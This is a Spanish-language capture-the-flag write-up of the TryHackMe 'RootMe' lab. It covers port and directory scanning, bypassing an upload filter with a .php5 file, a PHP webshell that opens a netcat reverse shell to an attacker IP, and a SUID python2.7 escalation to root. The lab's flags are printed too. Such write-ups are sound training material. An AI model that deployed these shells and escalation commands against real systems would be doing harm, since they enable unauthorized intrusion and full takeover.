Markdown
# TryHackMe - RootMe Writeup

**Plataforma**: TryHackMe  
**Dificultad**: Easy  
**OS**: Linux  
**IP objetivo**: 10.64.180.214  
**Fecha**: Febrero 2026  
**Autor**: Mauricio

## 🔍 Nmap Scan
**Comando**:
```bash
nmap -Pn -n -sV -sC -O -p- 10.64.180.214
nmap -Pn -n -sV -sC -O -p22,80 10.64.180.214

Puertos abiertos:

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

```


**Servicios interesantes**:

- Puerto 80: Apache 2.4.41 con PHP → posible vulnerabilidad de upload en /panel
- Puerto 22: OpenSSH 8.2p1 → no explotable directamente
- Nota: OS detection impreciso por pocos puertos abiertos, pero confirmado Linux por Apache y SSH.

## 🌐 Enumeración Web

### Fuzzing de directorios

**Comando**:


```
gobuster dir -u http://10.64.180.214/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-x txt,php,html,js -t 100
```

**Resultados clave**:

- /uploads/ (301) → Directorio de uploads abierto (index visible)
- /panel/ (301) → Panel de subida de archivos
- /index.php (200) → Página principal "HackIT - Home"
- /css/, /js/ → Recursos estáticos
- /server-status (403) → Denegado

### Endpoints interesantes

- [http://10.64.180.214/panel/](http://10.64.180.214/panel/) → Formulario de upload de archivos (PHP no permitido explícitamente)
- [http://10.64.180.214/uploads/](http://10.64.180.214/uploads/) → Listado de archivos subidos (Directory Listing habilitado)

## Foothold (Acceso inicial)

### Vulnerabilidad

**Tipo**: Arbitrary File Upload **Descripción**: El formulario en /panel/ permitía subir cualquier archivo sin validación fuerte de contenido o extensión. El mensaje decía "PHP is not allowed", pero solo bloqueaba la extensión .php exacta. Se podía bypass con extensiones alternativas como .php5, .phtml, etc.

**Extensión usada**: .php5 **Archivo subido**: shell.php5

**Reverse shell** (webshell simple con netcat):

PHP

```
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.167.92 4444 >/tmp/f");
?>
```

**Pasos**:

1. Listener en atacante:

    ```
    nc -lvnp 4444
    ```
2. Subir shell.php5 vía /panel/
3. Acceder: [http://10.64.180.214/uploads/shell.php5](http://10.64.180.214/uploads/shell.php5) → Conexión reverse shell como **www-data**

**Usuario inicial**: www-data

## Escalada de Privilegios

### Enumeración

**Comandos usados**:


```
find / -perm -u=s -type f 2>/dev/null
# o
find / -user root -perm -4000 -type f 2>/dev/null
```

**Hallazgo clave**:

- /usr/bin/python2.7 tenía bit SUID activado (misconfiguración intencional)

### Vector de escalada

**Método**: SUID en /usr/bin/python2.7 → ejecución de comandos como root

**Exploit** (de GTFOBins):

```
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Resultado**:

- Shell como **root** (euid=0)
- Escalada completada

## 🏁 Flags

**User Flag** (en /var/www/user.txt):

```
THM{y0u_g0t_a_sh3ll}
```

**Root Flag** (en /root/root.txt):

```
THM{pr1v1l3g3_3sc4l4t10n}
```

## Resumen del camino

1. Recon → puertos 22/80, Apache con PHP
2. Enumeración web → /panel/ + /uploads/ abierto
3. Bypass upload → .php5 + reverse shell con nc
4. Privesc → SUID en python2.7 → shell root